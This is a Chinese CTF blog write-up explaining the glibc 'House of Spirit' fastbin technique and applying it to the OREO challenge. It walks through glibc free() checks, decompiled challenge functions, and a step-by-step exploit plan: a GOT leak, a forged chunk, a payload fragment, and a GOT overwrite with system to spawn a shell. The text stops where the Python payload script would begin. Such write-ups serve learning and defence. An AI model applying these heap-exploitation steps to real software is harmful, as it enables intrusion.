<!DOCTYPE html>
<html lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <link rel="stylesheet" href="/style/style.css">
<script>
  var nlviconfig = {
    title: "dyf",
    author: "dyf",
    baseUrl: "/",
    theme: {
      scheme: "banderole",
      lightbox: true,
      animate: true,
      search: true,
      friends: false,
      reward: false,
      lazy: false
    }
  }
</script>




    <link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">




    <link rel="stylesheet" href="/syuanpi/syuanpi.min.css">











<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="browsermode" content="application">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="dyf">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="msapplication-navbutton-color" content="#666666">
<meta name="format-detection" content="telephone=no">
<meta name="keywords" content="nlvi, Nlvi">





  <title>
  dyf
  
</title>
</head>
<body>
  <div class="progress">
  <div class="progress-inner"></div>
</div>

  
    <div class="tagcloud-mask"></div>  
<div class="tagcloud" id="tagcloud">
  <div class="tagcloud-inner">
    <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
  </div>
</div>
  

  <div class="container" style="display:none;">

    <header class="header" id="header">
  <div class="header-wrapper">
    <div class="logo">
  <div class="logo-inner syuanpi tvIn">
    <span><a href="/">dyf</a></span>
    
  </div>
</div>
    <nav class="main-nav">
  
  <ul class="main-nav-list syuanpi tvIn">
  
    <li class="menu-item">
      <a href="javascript:;" id="search">
        <span>Search</span>
        
          <span class="menu-item-label">search</span>
        
      </a>
    </li>
  
  
    
      
    
    <li class="menu-item">
      <a href="/" id="article">
        <span class="base-name">Articles</span>
        
          <span class="menu-item-label">article</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/archives" id="archives">
        <span class="base-name">Archives</span>
        
          <span class="menu-item-label">archives</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="javascript:;" id="tags">
        <span class="base-name">Tags</span>
        
          <span class="menu-item-label">tags</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/about" id="about">
        <span class="base-name">About</span>
        
          <span class="menu-item-label">about</span>
        
      </a>
    </li>
  
  </ul>
  
</nav>

    
    
  </div>
</header>
<div class="mobile-header">
  <div class="mobile-header-body">
    <div class="mobile-header-list">
      
        
            <div class="mobile-nav-item">
                <a href="/">
                    <span>Articles</span>
                    
                    
                </a>
            </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/archives">
                    <span>Archives</span>
                    
                    
                </a>
            </div>
        
      
        
          <div class="mobile-nav-item inner-cloud">
            <div class="mobile-nav-tag">
              <a href="javascript:;" id="mobile-tags">
                <span>Tags</span>
                
                
              </a>
            </div>
            <div class="mobile-nav-tagcloud">
              <div class="mobile-tagcloud-inner">
                <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
              </div>
            </div>
          </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/about">
                    <span>About</span>
                    
                    
                </a>
            </div>
        
      
    </div>
  </div>
  <div class="mobile-header-nav">
    <div class="mobile-header-item" id="mobile-left">
      <div class="header-menu-item">
        <span class="header-menu-line"></span>
      </div>
    </div>
    <h1 class="mobile-header-title">
      <a href="/">dyf</a>
    </h1>
    <div class="mobile-header-item"></div>
  </div>
</div>
    <div class="container-inner">

    <h1 style="
    text-align:center;
    font-family:cathsgbr;
    color: #FC5185;
    font-weight:500;
    font-size:30px;
    ">The dyf's blog</h1>

      <main class="main" id="main">
        <div class="main-wrapper">
          
  

<section class="posts">
  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2020-01-08</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2020/01/08/hourse-of-spirit/">House of spirit</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h3><p>&emsp;&emsp;House of spirit是the malloc Maleficarum的一种技术。该技术的核心思想是伪造fastbin chunk并将其释放，从而达到分配任意地址的chunk的目的。<br>想要伪造fastbin fake chunk，主要需要绕过free时对其进行的检查：</p>
<ul>
<li>fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，则会进行单独处理。</li>
<li>fake chunk的地址需要对齐，MALLOC_ALIGN_MASK</li>
<li>fake chunk的size大小需要满足fastbin的要求，也需要对齐</li>
<li>fake chunk的nextchunk的大小不能小于2 * size_se，也不能大于av-&gt;system_mem</li>
<li>fake chunk对应的fastbin head不能为该chunk，否则会触发double free</li>
</ul>
<p>相关源码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">     || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">   malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">    multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 检查大小是否大于最小的chunk，是否对齐</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">   malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line"> check_inuse_chunk(av, p);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">   and used quickly in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">// 检查该chunk是否符合fastbin</span></span><br><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查nextchunk的size是否小于最小chunk要求，或大于系统最大chunk</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">		  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">		     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line"><span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line">  <span class="comment">// 检查是否有lock</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">"free(): invalid next size (fast)"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">// 将chunk的mem部分设置为perturb_byte</span></span><br><span class="line">   free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 设置fastbin标记位</span></span><br><span class="line">   atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 获取对应fastbin的头指针</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">   fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">   <span class="comment">// 使用原子操作将该chunk插入其中</span></span><br><span class="line">   mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">     &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"> <span class="comment">// 检查上一次插入的chunk是否与p相同，若相同则为double free</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">p-&gt;fd = old;</span><br><span class="line">*fb = p;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">  p-&gt;fd = old2 = old;</span><br><span class="line">&#125;</span><br><span class="line">     <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">      size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">      only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">      allocated again.  */</span></span><br><span class="line">   <span class="comment">// 确保插入前后相同</span></span><br><span class="line">   <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">"invalid fastbin entry (free)"</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>下面我们来做一道题看看</p>
<h3 id="OREO"><a href="#OREO" class="headerlink" title="OREO"></a>OREO</h3><p>Basic Info：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/ctf/work/pwn/fastbin/oreo/oreo'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
<p>该程序的大概逻辑是这样的，这是一个枪支系统。枪支的结构体如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 prev            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure></p>
<p>大概功能如下：</p>
<ol>
<li>添加枪支功能</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rifles</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar1;</span><br><span class="line">    undefined4 uVar2;</span><br><span class="line">    <span class="keyword">int32_t</span> in_GS_OFFSET;</span><br><span class="line">    <span class="keyword">int32_t</span> var_10h;</span><br><span class="line">    <span class="keyword">int32_t</span> var_ch;</span><br><span class="line">    </span><br><span class="line">    uVar2 = _rifles_head;</span><br><span class="line">    iVar1 = *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">    _rifles_head = sym.imp.<span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    <span class="keyword">if</span> (_rifles_head == <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *(undefined4 *)(_rifles_head + <span class="number">0x34</span>) = uVar2;</span><br><span class="line">        sym.imp.<span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">        sym.imp.fgets(_rifles_head + <span class="number">0x19</span>, <span class="number">0x38</span>, _section..bss);</span><br><span class="line">        add_End(_rifles_head + <span class="number">0x19</span>);</span><br><span class="line">        sym.imp.<span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">        sym.imp.fgets(_rifles_head, <span class="number">0x38</span>, _section..bss);</span><br><span class="line">        add_End(_rifles_head);</span><br><span class="line">        _rifles_counts = _rifles_counts + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致流程是首先将rifles_head储存起来，然后分配一个新的chunk来储存rifles struct，把rifles_head存到0x34的位置把name存到0x19的位置，desc存到开始的位置，然后rifles_count(0x804a2a4)++.<br>这样以来rifles就形成了一条链表。</p>
<p>我们注意到name和desc读入的size都是0x38这里明显存在溢出。</p>
<blockquote>
<p>其中add_End()函数是想字符串尾加一个‘\0’</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_End</span><span class="params">(<span class="keyword">int32_t</span> arg_8h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar1;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar2;</span><br><span class="line">    <span class="keyword">char</span> *pcVar3;</span><br><span class="line">    <span class="keyword">int32_t</span> in_GS_OFFSET;</span><br><span class="line">    <span class="keyword">int32_t</span> var_1ch;</span><br><span class="line">    <span class="keyword">int32_t</span> var_10h;</span><br><span class="line">    <span class="keyword">int32_t</span> var_ch;</span><br><span class="line">    </span><br><span class="line">    iVar1 = *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">    iVar2 = sym.imp.<span class="built_in">strlen</span>(arg_8h);</span><br><span class="line">    pcVar3 = (<span class="keyword">char</span> *)(arg_8h + iVar2 + <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (((<span class="keyword">uint32_t</span>)arg_8h &lt;= pcVar3) &amp;&amp; (*pcVar3 == <span class="string">'\n'</span>)) &#123;</span><br><span class="line">        *pcVar3 = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>查看所有枪支</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_added_rifles</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar1;</span><br><span class="line">    <span class="keyword">int32_t</span> in_GS_OFFSET;</span><br><span class="line">    <span class="keyword">int32_t</span> var_14h;</span><br><span class="line">    <span class="keyword">int32_t</span> var_10h;</span><br><span class="line">    <span class="keyword">int32_t</span> var_ch;</span><br><span class="line">    </span><br><span class="line">    iVar1 = *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="string">"Rifle to be ordered:\n%s\n"</span>, <span class="number">0x8048bb0</span>);</span><br><span class="line">    var_14h = _rifles_head;</span><br><span class="line">    <span class="keyword">while</span> (var_14h != <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, var_14h + <span class="number">0x19</span>);</span><br><span class="line">        sym.imp.<span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, var_14h);</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(<span class="number">0x8048bb0</span>);</span><br><span class="line">        var_14h = *(<span class="keyword">int32_t</span> *)(var_14h + <span class="number">0x34</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数会遍历rifles链表,然后打印name和desc</p>
<ol start="3">
<li>free所有的rifles</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">order_rifles</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar1;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar2;</span><br><span class="line">    <span class="keyword">int32_t</span> in_GS_OFFSET;</span><br><span class="line">    <span class="keyword">int32_t</span> var_14h;</span><br><span class="line">    <span class="keyword">int32_t</span> var_10h;</span><br><span class="line">    <span class="keyword">int32_t</span> var_ch;</span><br><span class="line">    </span><br><span class="line">    iVar1 = *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">    var_14h = _rifles_head;</span><br><span class="line">    <span class="keyword">if</span> (_rifles_counts == <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(<span class="string">"No rifles to be ordered!"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (var_14h != <span class="number">0</span>) &#123;</span><br><span class="line">            iVar2 = *(<span class="keyword">int32_t</span> *)(var_14h + <span class="number">0x34</span>);</span><br><span class="line">            sym.imp.<span class="built_in">free</span>(var_14h);</span><br><span class="line">            var_14h = iVar2;</span><br><span class="line">        &#125;</span><br><span class="line">        _rifles_head = <span class="number">0</span>;</span><br><span class="line">        _order_counts = _order_counts + <span class="number">1</span>;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(<span class="string">"Okay order submitted!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们可以看到这个函数会free链表上所有的rifles结构，但是没有设置为NULL。</p>
<ol start="4">
<li>leave message</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leave_message</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> iVar1;</span><br><span class="line">    <span class="keyword">int32_t</span> in_GS_OFFSET;</span><br><span class="line">    <span class="keyword">int32_t</span> var_ch;</span><br><span class="line">    </span><br><span class="line">    iVar1 = *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="string">"Enter any notice you\'d like to submit with your order: "</span>);</span><br><span class="line">    sym.imp.fgets(_message, <span class="number">0x80</span>, _section..bss);</span><br><span class="line">    add_End(_message);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != *(<span class="keyword">int32_t</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.__stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会向*message(0x804a2a8 -&gt; 0x804a2c0)这里写入一段内容,因此我们可以想办法控制message所存储的指针来实现任意写的效果。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>首先，我们可以覆盖node -&gt; prev，把printf的got地址写入该字段，然后通过show_rifles函数泄漏printf的实际地址。</li>
</ol>
<ol start="2">
<li><ul>
<li>我们可以在0x804a2a0处伪造一个chunk，由于一个rifle的大小为0x38，因此我们选择伪造size为0x41的fastbin chunk。这时我们发现0x804a2a4即rifles_count，这个值正好是chunk的size字段，因此我们可以在free这个chunk之前 add 0x41个rifles就可以控制其大小。</li>
<li>但是这里还有一点需要注意，我们还需要修改下一个物理相邻chunk的size，我们算了一下偏移，0x804a2a0 + 0x40 = 0x804a2e0,这个地方就是next_chunk的size字段，我们可以通过leave_message()来覆盖这个字段，<em>message即0x804a2c0这里写入一段信息，我们计算一下偏移0x804a2e0 - 0x804a2c0 = 0x20 == 32. 再加上4个字节覆盖掉prev_size,因此一共输入36个字节的padding就能到达size字段。所以paload = ‘\x00’ </em> 36 + p32(0x41)</li>
<li>这里之所以用\x00做padding是因为要把fake_chunk的prev设成null，否则free之后会出错。</li>
</ul>
</li>
<li><p>最后，我们就重新分配rifle，获得刚刚伪造的chunk，然后覆盖message指针的地址，将其设置为strlen()函数的got地址，然后leave_message()用system()覆盖got表,即可getshell。</p>
</li>
</ol>
<p>到这里思路已经十分明确了，payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 